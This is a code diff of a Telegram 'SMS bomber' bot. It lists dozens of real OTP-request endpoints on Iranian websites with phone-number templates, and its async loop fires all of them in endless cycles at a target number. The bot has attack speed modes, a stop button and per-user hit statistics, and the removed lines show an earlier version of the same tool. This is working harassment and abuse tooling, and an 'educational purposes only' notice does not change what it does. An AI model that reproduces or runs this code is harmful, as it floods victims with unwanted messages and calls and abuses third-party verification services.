+            "phone_number": "{phone}",
+            "country_code": "+98",
+            "captcha_token": ""
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 8
+    },
+    {
+        "source": "rhino.ir",
+        "url": "https://rhino-api.smartbytes.ir/auth/send-otp",
+        "json": {
+            "phone_number": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 3,
+        "ticket": 43
+    },
+    {
+        "source": "ring.ir",
+        "url": "https://ring.ir/api/v1/auth/otp",
+        "json": {
+            "mobile": "+98{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 5
+    },
+    {
+        "source": "roboo.ir",
+        "url": "https://api.roboo.ir/api/Users/SendVerificationCode?PhoneNumber=0{phone}&code=1302817798429812",
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 27
+    },
+    {
+        "source": "salamati24.com",
+        "url": "https://www.salamati24.com/api/activationcode?mobile=0{phone}&as_register=1&roleId=-2",
+        "method": "GET",
+        "capacity": 20,
+        "ticket": 13
+    },
+    {
+        "source": "sanjagh.pro",
+        "url": "https://sanjagh.pro/reborn-api/exp/api/session/v2/registerCell",
+        "json": {
+            "cell": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "sibche.com",
+        "url": "https://api.sibche.com/profile/sendCode",
+        "json": {
+            "mobile": "0{phone}",
+            "spec-g": null,
+            "g-recaptcha-response": "null"
+        },
+        "method": "POST",
+        "capacity": 3,
+        "ticket": 22
+    },
+    {
+        "source": "skyroom.online",
+        "url": "https://www.skyroom.online/auth/api/authenticate",
+        "json": {
+            "mobile_number": "0{phone}",
+            "country_code": "98"
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 8
+    },
+    {
+        "source": "tabdeal.org",
+        "url": "https://api-web.tabdeal.org/register/",
+        "json": {
+            "phone_or_email": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 3,
+        "ticket": 43
+    },
+    {
+        "source": "takhfifan.com",
+        "url": "https://takhfifan.com/v6/api/magento/login/init",
+        "json": {
+            "username": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "talasea.ir",
+        "url": "https://api.talasea.ir/api/auth/sentOTP",
+        "json": {
+            "phoneNumber": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 4,
+        "ticket": 65
+    },
+    {
+        "source": "tapsi.ir",
+        "url": "https://api.tapsi.ir/api/v2.2/user",
+        "json": {
+            "credential": {
+                "phoneNumber": "0{phone}",
+                "role": "DRIVER"
+            },
+            "otpOption": "SMS"
+        },
+        "method": "POST",
+        "capacity": 10,
+        "ticket": 68
+    },
+    {
+        "source": "telewebion.ir",
+        "url": "https://gateway.telewebion.ir/shenaseh/api/v2/auth/step-one",
+        "json": {
+            "phone": "{phone}",
+            "code": "98",
+            "smsStatus": "1",
+            "notification_method": "sms"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "tetherland.com",
+        "url": "https://service.tetherland.com/api/v5/login-register",
+        "json": {
+            "mobile": "0{phone}",
+            "device_info": {
+                "brand": "",
+                "model": "",
+                "browserVersion": "147.0",
+                "app_version": "",
+                "by": "web",
+                "osName": "Windows",
+                "osVersion": "11",
+                "browserName": "Firefox",
+                "platform": "web",
+                "name": "Windows",
+                "device": "web"
+            },
+            "otp_type": "sms",
+            "device": "web"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "torob.com",
+        "url": "https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{phone}&source=next_desktop&_landing_page=home",
+        "method": "GET",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "tosinso.com",
+        "url": "https://tosinso.com/api/auth/send-code",
+        "json": {
+            "type": "mobile",
+            "value": "{phone}",
+            "countryCode": "+98"
+        },
+        "method": "POST",
+        "capacity": 5,
+        "ticket": 65
+    },
+    {
+        "source": "uploadkon.ir",
+        "url": "https://uploadkon.ir/ucp.php?go=sendotp",
+        "data": {
+            "phone": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 250,
+        "ticket": 100
+    },
+    {
+        "source": "virgool.io",
+        "url": "https://virgool.io/api2/app/auth/verify",
+        "json": {
+            "identifier": "+98{phone}",
+            "method": "phone",
+            "type": "register"
+        },
+        "method": "POST",
+        "capacity": 3,
+        "ticket": 22
+    },
+    {
+        "source": "vmusic.ir",
+        "url": "https://api.vmusic.ir/auth/otp/request",
+        "json": {
+            "mobile": "0{phone}"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "wisgoon.com",
+        "url": "https://gateway.wisgoon.com/api/v8/auth/login/",
+        "json": {
+            "phone": "+98{phone}",
+            "token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "yarai.ir",
+        "url": "https://chat.yarai.ir/api/v1/otps/request-otp",
+        "json": {
+            "phone": "0{phone}",
+            "isAndroid": false
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 5
+    },
+    {
+        "source": "zap-express.com",
+        "url": "https://api.zap-express.com/fr/Registration/SendVerificationCode",
+        "json": {
+            "mobile": "0{phone}",
+            "registrationCategoryId": 1,
+            "representativeCode": "",
+            "utmInfo": {
+                "utM_Source": "alopeyk",
+                "utM_Medium": "online",
+                "utM_Campaign": "site",
+                "utM_Content": "",
+                "utM_Term": ""
+            }
+        },
+        "method": "POST",
+        "capacity": 1,
+        "ticket": 62
+    },
+    {
+        "source": "zigap.ir",
+        "url": "https://gateway.zigap.ir/api/v1.9/authenticate/sendotp",
+        "json": {
+            "phoneNumber": "+98{phone}"
+        },
+        "method": "POST",
+        "capacity": 20,
+        "ticket": 5
+    }
+   ]
 
-# ============================================================
-# API HANDLER
-# ============================================================
+async def hit_api(session, api, phone, stats):
+    """Hit a single API endpoint"""
+    try:
+        # Get URL and data
+        url = api["url"]
+        data = api["data"](phone) if api["data"] else None
+        
+        # Handle callable URLs
+        if callable(url):
+            url = url(phone)
+        
+        # Make request
+        async with session.request(
+            method=api["method"],
+            url=url,
+            headers=api["headers"],
+            data=data,
+            timeout=aiohttp.ClientTimeout(total=5),
+            ssl=False  # Bypass SSL verification for better success rate
+        ) as response:
+            status = response.status
+            if status in [200, 201, 202, 204]:
+                api_type = api.get("type", "SMS")
+                stats[api_type] = stats.get(api_type, 0) + 1
+                return True
+    except Exception as e:
+        logger.debug(f"API {api.get('name', 'Unknown')} failed: {str(e)}")
+    return False
 
-class APIHandler:
-    def __init__(self):
-        self.api_templates = []
-        self.ua = UserAgent()
-        self.load_apis()
+async def animate_message(chat_id, message_id, text_prefix="", frames=None):
+    """Animate a message with loading frames"""
+    if frames is None:
+        frames = ANIMATION_FRAMES
     
-    def load_apis(self):
+    for frame in frames:
         try:
-            if os.path.exists(Config.API_TEMPLATES_FILE):
-                with open(Config.API_TEMPLATES_FILE, 'r', encoding='utf-8') as f:
-                    self.api_templates = json.load(f)
-                print(f"✅ Loaded {len(self.api_templates)} API templates")
-            else:
-                print(f"⚠️ API file not found, creating example...")
-                example = [
-                    {
-                        "source": "example",
-                        "url": "https://example.com/api/send?phone=0{phone}",
-                        "method": "GET",
-                        "capacity": 10,
-                        "ticket": 20
-                    }
-                ]
-                with open(Config.API_TEMPLATES_FILE, 'w', encoding='utf-8') as f:
-                    json.dump(example, f, indent=2)
-                self.api_templates = example
-                print(f"✅ Created example API file")
-        except Exception as e:
-            print(f"❌ Error loading APIs: {e}")
-            self.api_templates = []
+            await bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text=f"{frame} {text_prefix}"
+            )
+            await asyncio.sleep(0.5)
+        except:
+            break
+
+def create_main_keyboard():
+    """Create main reply keyboard"""
+    builder = ReplyKeyboardBuilder()
+    builder.row(types.KeyboardButton(text="🚀 Start Infinite Boom"))
+    builder.row(types.KeyboardButton(text="📊 Check Stats"))
+    builder.row(types.KeyboardButton(text="ℹ️ Help"))
+    builder.row(types.KeyboardButton(text="👨‍💻 Developer"))
+    return builder.as_markup(resize_keyboard=True)
+
+def create_stop_keyboard():
+    """Create stop attack keyboard"""
+    builder = ReplyKeyboardBuilder()
+    builder.row(types.KeyboardButton(text="🛑 STOP ATTACK"))
+    builder.row(types.KeyboardButton(text="📊 Live Stats"))
+    builder.row(types.KeyboardButton(text="🏠 Main Menu"))
+    return builder.as_markup(resize_keyboard=True)
+
+def create_stats_inline_keyboard():
+    """Create inline keyboard for stats"""
+    builder = InlineKeyboardBuilder()
+    builder.row(
+        InlineKeyboardButton(text="🔄 Refresh Stats", callback_data="refresh_stats"),
+        InlineKeyboardButton(text="📈 All Time Stats", callback_data="alltime_stats")
+    )
+    builder.row(
+        InlineKeyboardButton(text="⚡ Fast Attack", callback_data="fast_attack"),
+        InlineKeyboardButton(text="🐢 Slow Attack", callback_data="slow_attack")
+    )
+    return builder.as_markup()
+
+@dp.message(CommandStart())
+async def start_command(message: types.Message):
+    """Handle /start command"""
+    welcome_text = f"""
+🎯 <b>CLOUD LEAKED BOMBER BOT</b> 🎯
+
+<b>Developer:</b> {DEVELOPER_ID}
+<b>Active APIs:</b> {len(ULTIMATE_APIS)}
+<b>Types:</b> Calls, SMS, WhatsApp
+
+📌 <b>Commands:</b>
+• Send 10-digit number to start attack
+• Use buttons below for control
+
+🔥 <b>Features:</b>
+• Multiple API endpoints
+• Real-time stats
+• Attack control
+• Live animations
+• Fast & Slow modes
+
+⚠️ <b>Warning:</b> Use responsibly!
+    """
     
-    def get_headers(self) -> Dict:
-        return {
-            'User-Agent': self.ua.random,
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/json',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-        }
+    await message.answer(
+        welcome_text,
+        reply_markup=create_main_keyboard(),
+        parse_mode="HTML"
+    )
+
+@dp.message(F.text == "ℹ️ Help")
+async def help_command(message: types.Message):
+    """Show help information"""
+    help_text = f"""
+🆘 <b>HELP & GUIDE</b> 🆘
+
+<b>How to use:</b>
+1. Click <b>'🚀 Start Infinite Boom'</b>
+2. Send <b>10-digit phone number</b> (without +91)
+3. Attack will start automatically
+4. Use <b>'🛑 STOP ATTACK'</b> to stop
+
+<b>Available Commands:</b>
+• /start - Start bot
+• /stats - Show statistics
+• /stop - Stop current attack
+• /help - This message
+
+<b>Attack Types:</b>
+• Calls 📞 - Voice call OTPs
+• SMS 📩 - Text message OTPs
+• WhatsApp 💬 - WhatsApp messages
+
+<b>Developer:</b> {DEVELOPER_ID}
+<b>Support:</b> Contact developer for issues
+
+⚠️ <b>Legal Notice:</b>
+This bot is for educational purposes only.
+Misuse may lead to legal consequences.
+    """
     
-    def format_phone(self, phone: str) -> str:
-        phone = re.sub(r'[^0-9]', '', phone)
-        if len(phone) == 10:
-            return '0' + phone
-        return phone
+    await message.answer(help_text, parse_mode="HTML")
+
+@dp.message(F.text == "👨‍💻 Developer")
+async def developer_info(message: types.Message):
+    """Show developer information"""
+    dev_text = f"""
+👨‍💻 <b>DEVELOPER INFORMATION</b>
+
+<b>Developer:</b> {DEVELOPER_ID}
+<b>Bot Version:</b> 2.0
+<b>Last Updated:</b> {time.strftime('%Y-%m-%d')}
+
+🔧 <b>Technical Details:</b>
+• Built with Python & aiogram
+• Async requests for speed
+• Multi-API support
+• Real-time monitoring
+
+📞 <b>Contact:</b>
+Telegram: {DEVELOPER_ID}
+For support and feature requests
+
+🚀 <b>Features Coming Soon:</b>
+• More API endpoints
+• Custom attack patterns
+• Scheduled attacks
+• Advanced analytics
+
+⭐ <b>Please rate and review!</b>
+    """
     
-    async def send_request(self, template: Dict, phone: str, session: aiohttp.ClientSession) -> Tuple[bool, float, str]:
-        try:
-            url = template.get('url', '')
-            method = template.get('method', 'GET').upper()
-            phone = self.format_phone(phone)
-            
-            # Replace phone in URL with both formats
-            url = url.replace('{phone}', phone)
-            url = url.replace('98{phone}', phone[1:] if phone.startswith('0') else phone)
-            url = url.replace('0{phone}', phone)
-            
-            headers = self.get_headers()
-            timeout = aiohttp.ClientTimeout(total=Config.TIMEOUT)
-            
-            start_time = time.time()
-            
-            # Prepare JSON
-            json_data = template.get('json', {})
-            if json_data:
-                json_str = json.dumps(json_data)
-                json_str = json_str.replace('{phone}', phone)
-                json_str = json_str.replace('98{phone}', phone[1:] if phone.startswith('0') else phone)
-                json_str = json_str.replace('0{phone}', phone)
-                json_data = json.loads(json_str)
-            
-            # Prepare data
-            data = template.get('data', {})
-            if data:
-                data_str = json.dumps(data) if isinstance(data, dict) else str(data)
-                data_str = data_str.replace('{phone}', phone)
-                data_str = data_str.replace('98{phone}', phone[1:] if phone.startswith('0') else phone)
-                data_str = data_str.replace('0{phone}', phone)
-                if isinstance(data, dict):
-                    data = json.loads(data_str)
-            
-            async with session.request(
-                method=method,
-                url=url,
-                json=json_data if json_data else None,
-                data=data if data else None,
-                headers=headers,
-                timeout=timeout,
-                ssl=False
-            ) as response:
-                elapsed = time.time() - start_time
-                if 200 <= response.status < 300:
-                    return True, elapsed, f"✅ OK"
-                else:
-                    return False, elapsed, f"❌ {response.status}"
+    await message.answer(dev_text, parse_mode="HTML")
+
+@dp.message(F.text == "📊 Check Stats")
+async def check_stats(message: types.Message):
+    """Show current statistics"""
+    user_id = message.from_user.id
+    stats = attack_stats.get(user_id, {})
+    
+    if not stats:
+        stats_text = "📊 <b>No attack statistics available yet.</b>\nStart an attack to see stats!"
+    else:
+        calls = stats.get('Call', 0)
+        sms = stats.get('SMS', 0)
+        whatsapp = stats.get('WhatsApp', 0)
+        total = calls + sms + whatsapp
+        
+        stats_text = f"""
+📊 <b>ATTACK STATISTICS</b>
+
+<b>Total Hits:</b> {total}
+<b>📞 Calls:</b> {calls}
+<b>📩 SMS:</b> {sms}
+<b>💬 WhatsApp:</b> {whatsapp}
+
+<b>Success Rate:</b> {(total / (len(ULTIMATE_APIS) * (stats.get('cycles', 1))) * 100):.1f}%
+<b>Active APIs:</b> {len(ULTIMATE_APIS)}
+<b>Last Updated:</b> Just now
+        """
+    
+    await message.answer(
+        stats_text,
+        reply_markup=create_stats_inline_keyboard(),
+        parse_mode="HTML"
+    )
+
+@dp.message(F.text == "🚀 Start Infinite Boom")
+async def start_attack_prompt(message: types.Message):
+    """Prompt for phone number"""
+    await message.answer(
+        "📱 <b>Enter target phone number (10 digits):</b>\n\n"
+        "Example: <code>9876543210</code>\n\n"
+        "⚠️ Make sure it's 10 digits without +91",
+        parse_mode="HTML"
+    )
+
+@dp.message(F.text == "🛑 STOP ATTACK")
+async def stop_attack(message: types.Message):
+    """Stop current attack"""
+    user_id = message.from_user.id
+    
+    if user_id in stop_signals:
+        stop_signals[user_id] = True
+        await message.answer(
+            "🛑 <b>Attack stopping...</b>\n"
+            "Current cycle will complete and then stop.",
+            reply_markup=create_main_keyboard()
+        )
+        
+        # Clear attack state after delay
+        await asyncio.sleep(2)
+        if user_id in user_attacks:
+            del user_attacks[user_id]
+    else:
+        await message.answer(
+            "ℹ️ <b>No active attack to stop.</b>\n"
+            "Start an attack first.",
+            reply_markup=create_main_keyboard()
+        )
+
+@dp.message(F.text == "📊 Live Stats")
+async def live_stats(message: types.Message):
+    """Show live attack statistics"""
+    user_id = message.from_user.id
+    
+    if user_id in attack_stats:
+        stats = attack_stats[user_id]
+        calls = stats.get('Call', 0)
+        sms = stats.get('SMS', 0)
+        whatsapp = stats.get('WhatsApp', 0)
+        total = calls + sms + whatsapp
+        
+        live_text = f"""
+📊 <b>LIVE ATTACK STATISTICS</b>
+
+<b>Total Hits:</b> {total}
+<b>📞 Calls:</b> {calls}
+<b>📩 SMS:</b> {sms}
+<b>💬 WhatsApp:</b> {whatsapp}
+
+<b>Status:</b> {'⚡ ACTIVE' if user_id in user_attacks else '⏸️ PAUSED'}
+<b>Last Hit:</b> {stats.get('last_update', 'N/A')}
+        """
+    else:
+        live_text = "ℹ️ <b>No active attack.</b> Start an attack to see live stats."
+    
+    await message.answer(live_text, parse_mode="HTML")
+
+@dp.message(F.text == "🏠 Main Menu")
+async def main_menu(message: types.Message):
+    """Return to main menu"""
+    await message.answer(
+        "🏠 <b>Main Menu</b>\nSelect an option:",
+        reply_markup=create_main_keyboard(),
+        parse_mode="HTML"
+    )
+
+@dp.callback_query(F.data == "refresh_stats")
+async def refresh_stats_callback(callback: types.CallbackQuery):
+    """Refresh statistics"""
+    user_id = callback.from_user.id
+    stats = attack_stats.get(user_id, {})
+    
+    calls = stats.get('Call', 0)
+    sms = stats.get('SMS', 0)
+    whatsapp = stats.get('WhatsApp', 0)
+    total = calls + sms + whatsapp
+    
+    stats_text = f"""
+🔄 <b>STATISTICS REFRESHED</b>
+
+<b>Total Hits:</b> {total}
+<b>📞 Calls:</b> {calls}
+<b>📩 SMS:</b> {sms}
+<b>💬 WhatsApp:</b> {whatsapp}
+
+<b>Updated:</b> {time.strftime('%H:%M:%S')}
+    """
+    
+    await callback.message.edit_text(
+        stats_text,
+        reply_markup=create_stats_inline_keyboard(),
+        parse_mode="HTML"
+    )
+    await callback.answer("✅ Statistics refreshed!")
+
+@dp.callback_query(F.data == "alltime_stats")
+async def alltime_stats_callback(callback: types.CallbackQuery):
+    """Show all-time statistics"""
+    # This would track all attacks, for now show current
+    await callback.answer("📈 All-time stats feature coming soon!")
+
+@dp.callback_query(F.data == "fast_attack")
+async def fast_attack_callback(callback: types.CallbackQuery):
+    """Switch to fast attack mode"""
+    user_id = callback.from_user.id
+    if user_id in user_attacks:
+        user_attacks[user_id]['delay'] = 2  # 2 seconds delay
+        await callback.answer("⚡ Fast mode activated (2s delay)")
+    else:
+        await callback.answer("Start an attack first!")
+
+@dp.callback_query(F.data == "slow_attack")
+async def slow_attack_callback(callback: types.CallbackQuery):
+    """Switch to slow attack mode"""
+    user_id = callback.from_user.id
+    if user_id in user_attacks:
+        user_attacks[user_id]['delay'] = 10  # 10 seconds delay
+        await callback.answer("🐢 Slow mode activated (10s delay)")
+    else:
+        await callback.answer("Start an attack first!")
+
+@dp.message(F.text.regexp(r'^\d{10}$'))
+async def handle_phone_number(message: types.Message):
+    """Handle phone number input and start attack"""
+    user_id = message.from_user.id
+    phone = message.text
+    
+    # Validate phone number
+    if not phone.startswith(('6', '7', '8', '9')):
+        await message.answer(
+            "❌ <b>Invalid phone number!</b>\n"
+            "Indian numbers start with 6,7,8, or 9.\n"
+            "Please enter a valid 10-digit number.",
+            parse_mode="HTML"
+        )
+        return
+    
+    # Initialize attack
+    stop_signals[user_id] = False
+    user_attacks[user_id] = {
+        'phone': phone,
+        'start_time': time.time(),
+        'delay': 5,  # Default delay
+        'cycles': 0
+    }
+    attack_stats[user_id] = {
+        'Call': 0,
+        'SMS': 0,
+        'WhatsApp': 0,
+        'cycles': 0,
+        'last_update': time.strftime('%H:%M:%S')
+    }
+    
+    # Send starting animation
+    start_msg = await message.answer(
+        "🎯 <b>INITIALIZING ATTACK...</b>\n\n"
+        f"<b>Target:</b> <code>{phone}</code>\n"
+        f"<b>APIs Loaded:</b> {len(ULTIMATE_APIS)}\n"
+        f"<b>Mode:</b> INFINITE\n\n"
+        "⚡ Preparing to fire...",
+        parse_mode="HTML",
+        reply_markup=create_stop_keyboard()
+    )
+    
+    # Run animation
+    await animate_message(message.chat.id, start_msg.message_id, f"Target: {phone}")
+    
+    # Start attack in background
+    asyncio.create_task(run_attack(user_id, phone, message.chat.id, start_msg.message_id))
+    
+    # Update with initial status
+    await bot.edit_message_text(
+        chat_id=message.chat.id,
+        message_id=start_msg.message_id,
+        text=f"🚀 <b>ATTACK STARTED!</b>\n\n"
+             f"<b>Target:</b> <code>{phone}</code>\n"
+             f"<b>Status:</b> Firing APIs...\n"
+             f"<b>Hits:</b> 0\n"
+             f"<b>Next cycle:</b> 5s",
+        parse_mode="HTML",
+        reply_markup=create_stop_keyboard()
+    )
+
+async def run_attack(user_id, phone, chat_id, message_id):
+    """Run the attack loop"""
+    stats = attack_stats[user_id]
+    attack_info = user_attacks[user_id]
+    delay = attack_info['delay']
+    
+    async with aiohttp.ClientSession() as session:
+        cycle_count = 0
+        
+        while not stop_signals.get(user_id, False):
+            try:
+                cycle_count += 1
+                attack_info['cycles'] = cycle_count
+                stats['cycles'] = cycle_count
+                
+                # Fire all APIs
+                tasks = [hit_api(session, api, phone, stats) for api in ULTIMATE_APIS]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                
+                # Calculate hits
+                calls = stats.get('Call', 0)
+                sms = stats.get('SMS', 0)
+                whatsapp = stats.get('WhatsApp', 0)
+                total = calls + sms + whatsapp
+                
+                # Update message
+                stats['last_update'] = time.strftime('%H:%M:%S')
+                
+                # Update status message
+                status_text = f"""
+🎯 <b>ACTIVE ATTACK - CYCLE {cycle_count}</b>
+
+<b>Target:</b> <code>{phone}</code>
+<b>Status:</b> ⚡ RUNNING
+<b>Delay:</b> {delay}s
+
+📊 <b>STATISTICS:</b>
+<b>📞 Calls:</b> {calls}
+<b>📩 SMS:</b> {sms}
+<b>💬 WhatsApp:</b> {whatsapp}
+<b>🔥 Total Hits:</b> {total}
+
+<b>Next cycle in:</b> {delay}s
+<b>Last Update:</b> {stats['last_update']}
+                """
+                
+                try:
+                    await bot.edit_message_text(
+                        chat_id=chat_id,
+                        message_id=message_id,
+                        text=status_text,
+                        parse_mode="HTML",
+                        reply_markup=create_stop_keyboard()
+                    )
+                except Exception as e:
+                    logger.error(f"Failed to update message: {e}")
+                
+                # Check if we should stop
+                if stop_signals.get(user_id, False):
+                    break
                     
-        except asyncio.TimeoutError:
-            return False, Config.TIMEOUT, "⏱️ Timeout"
-        except Exception as e:
-            return False, 0, f"⚠️ {str(e)[:20]}"
-
-# ============================================================
-# BOMBER ENGINE
-# ============================================================
-
-class BomberEngine:
-    def __init__(self):
-        self.api_handler = APIHandler()
-        self.db = Database()
-        self._stop_flags = {}
-    
-    async def bomb_phone(self, user_id: int, phone: str, count: int, update_callback=None) -> Tuple[int, int]:
-        phone = re.sub(r'[^0-9]', '', phone)
-        if len(phone) == 10:
-            phone = '0' + phone
-        if not phone or len(phone) < 10:
-            return 0, 0
-        
-        attack_id = self.db.start_attack(user_id, phone)
-        self._stop_flags[user_id] = False
-        
-        successful = 0
-        failed = 0
-        sent = 0
-        
-        apis = self.api_handler.api_templates.copy()
-        if not apis:
-            return 0, 0
-        
-        random.shuffle(apis)
-        start_time = time.time()
-        max_duration = Config.ATTACK_DURATION
-        
-        async with aiohttp.ClientSession() as session:
-            while sent < count:
-                if self._stop_flags.get(user_id, False):
-                    break
-                if time.time() - start_time > max_duration:
-                    break
-                if not self.db.is_attack_running(user_id):
-                    break
+                # Wait for next cycle
+                await asyncio.sleep(delay)
                 
-                chunk_size = min(5, count - sent)
-                tasks = []
-                for _ in range(chunk_size):
-                    api = random.choice(apis)
-                    tasks.append(self.api_handler.send_request(api, phone, session))
-                
-                results = await asyncio.gather(*tasks)
-                
-                for success, elapsed, msg in results:
-                    if success:
-                        successful += 1
-                    else:
-                        failed += 1
-                    sent += 1
-                
-                self.db.update_attack_stats(attack_id, successful, failed)
-                
-                if update_callback:
-                    try:
-                        await update_callback(sent, successful, failed)
-                    except:
-                        pass
-                
-                await asyncio.sleep(0.2)
-                
-                if sent >= count:
-                    break
-        
-        self.db.complete_attack(attack_id)
-        self._stop_flags.pop(user_id, None)
-        
-        return successful, failed
+            except Exception as e:
+                logger.error(f"Attack error for user {user_id}: {e}")
+                await asyncio.sleep(5)  # Wait before retry
     
-    def stop_attack(self, user_id: int) -> bool:
-        self._stop_flags[user_id] = True
-        return self.db.stop_attack(user_id)
+    # Attack stopped
+    final_stats = attack_stats.get(user_id, {})
+    calls = final_stats.get('Call', 0)
+    sms = final_stats.get('SMS', 0)
+    whatsapp = final_stats.get('WhatsApp', 0)
+    total = calls + sms + whatsapp
     
-    def is_attack_running(self, user_id: int) -> bool:
-        return self.db.is_attack_running(user_id)
+    final_text = f"""
+🛑 <b>ATTACK STOPPED</b>
 
-# ============================================================
-# TELEGRAM BOT
-# ============================================================
+<b>Target:</b> <code>{phone}</code>
+<b>Total Cycles:</b> {cycle_count}
+<b>Duration:</b> {time.time() - attack_info['start_time']:.1f}s
 
-class SMSBomberBot:
-    def __init__(self):
-        self.db = Database()
-        self.bomber = BomberEngine()
-        self._active_tasks = {}
-    
-    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        user = update.effective_user
-        if not self.db.get_user(user.id):
-            self.db.add_user(user_id=user.id, username=user.username, 
-                           first_name=user.first_name, last_name=user.last_name)
-        
-        has_access = self.db.user_has_access(user.id)
-        user_data = self.db.get_user(user.id)
-        expiry = user_data.get('access_expiry') if user_data else None
-        
-        msg = f"""🍞 BREAD SMS BOMBER 🍞
+📊 <b>FINAL STATISTICS:</b>
+<b>📞 Calls:</b> {calls}
+<b>📩 SMS:</b> {sms}
+<b>💬 WhatsApp:</b> {whatsapp}
+<b>🔥 Total Hits:</b> {total}
 
-Welcome {user.first_name}!
+<b>Status:</b> ✅ COMPLETED
+<b>Time:</b> {time.strftime('%H:%M:%S')}
+    """
+    
+    try:
+        await bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=final_text,
+            parse_mode="HTML",
+            reply_markup=create_main_keyboard()
+        )
+    except:
+        pass
+    
+    # Clean up
+    if user_id in stop_signals:
+        del stop_signals[user_id]
+    if user_id in user_attacks:
+        del user_attacks[user_id]
 
-🚀 Commands:
-/start - Show this message
-/help - Show help
-/bomb phone count - Start bombing
-/stop - Stop attack
+@dp.message(Command("stop"))
+async def stop_command(message: types.Message):
+    """Handle /stop command"""
+    await stop_attack(message)
 
-Access: {'✅ Active' if has_access else '❌ No Access'}
-{f'⏱️ Expires: {expiry[:16]}' if expiry and has_access else ''}"""
-        
-        await update.message.reply_text(msg)
-    
-    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        user_id = update.effective_user.id
-        is_admin = user_id in Config.ADMIN_IDS
-        
-        msg = """📖 BREAD SMS BOMBER HELP
+@dp.message(Command("stats"))
+async def stats_command(message: types.Message):
+    """Handle /stats command"""
+    await check_stats(message)
 
-User Commands:
-/bomb 09XXXXXXXXX count - Send SMS
-  Example: /bomb 09123456789 100
-  
-/stop - Stop your attack"""
-        
-        if is_admin:
-            msg += """
+@dp.message(Command("help"))
+async def help_command_handler(message: types.Message):
+    """Handle /help command"""
+    await help_command(message)
 
-Admin Commands:
-/add user_id duration - Add user
-  Duration: 1m, 1h, 1d, 1w, 1mo
-/remove user_id - Remove user
-/state - System state
-/clear_state - Clear all data"""
-        
-        await update.message.reply_text(msg)
-    
-    async def bomb_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        user_id = update.effective_user.id
-        
-        if not self.db.user_has_access(user_id):
-            await update.message.reply_text("❌ Access Denied! Contact admin.")
-            return
-        
-        if self.bomber.is_attack_running(user_id):
-            await update.message.reply_text("⚠️ Attack running! Use /stop first.")
-            return
-        
-        args = context.args
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /bomb 09XXXXXXXXX count\nExample: /bomb 09123456789 100")
-            return
-        
-        phone = args[0]
-        try:
-            count = int(args[1])
-            if count < 1: count = 1
-            if count > 1000: count = 1000
-        except:
-            await update.message.reply_text("❌ Count must be a number!")
-            return
-        
-        phone = re.sub(r'[^0-9]', '', phone)
-        if len(phone) == 10:
-            phone = '0' + phone
-        if len(phone) != 11 or not phone.startswith('0'):
-            await update.message.reply_text("❌ Invalid phone! Use 11 digits: 09123456789")
-            return
-        
-        attack_msg = await update.message.reply_text(f"🚀 Starting attack on {phone}\n📊 Target: {count} SMS\n⏱️ Duration: 5 min max")
-        
-        async def update_progress(sent, success, failed):
-            try:
-                await attack_msg.edit_text(
-                    f"🚀 Attack in Progress...\n"
-                    f"📱 Phone: {phone}\n"
-                    f"✅ Sent: {sent}/{count}\n"
-                    f"✅ Success: {success}\n"
-                    f"❌ Failed: {failed}"
-                )
-            except: pass
-        
-        async def run_attack():
-            success, failed = await self.bomber.bomb_phone(user_id, phone, count, update_progress)
-            total = success + failed
-            msg = f"✅ Attack Completed!\n📱 Phone: {phone}\n✅ Success: {success}\n❌ Failed: {failed}\n📊 Total: {total}"
-            if success == 0 and total > 0:
-                msg += "\n\n⚠️ No SMS sent! APIs may be blocked."
-            await attack_msg.edit_text(msg)
-        
-        task = asyncio.create_task(run_attack())
-        self._active_tasks[user_id] = task
-        task.add_done_callback(lambda t: self._active_tasks.pop(user_id, None))
-    
-    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        user_id = update.effective_user.id
-        if not self.db.user_has_access(user_id):
-            await update.message.reply_text("❌ Access Denied!")
-            return
-        
-        if self.bomber.is_attack_running(user_id):
-            self.bomber.stop_attack(user_id)
-            await update.message.reply_text("⏹️ Attack Stopped!")
-        else:
-            await update.message.reply_text("ℹ️ No running attack.")
-    
-    # ========== ADMIN COMMANDS ==========
-    
-    async def add_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        user_id = update.effective_user.id
-        if user_id not in Config.ADMIN_IDS:
-            await update.message.reply_text("❌ Not authorized!")
-            return
-        
-        args = context.args
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /add user_id duration\nExample: /add 123456789 1d")
-            return
-        
-        try:
-            target_user_id = int(args[0])
-            duration_str = args[1].lower()
-        except:
-            await update.message.reply_text("❌ Invalid user ID!")
-            return
-        
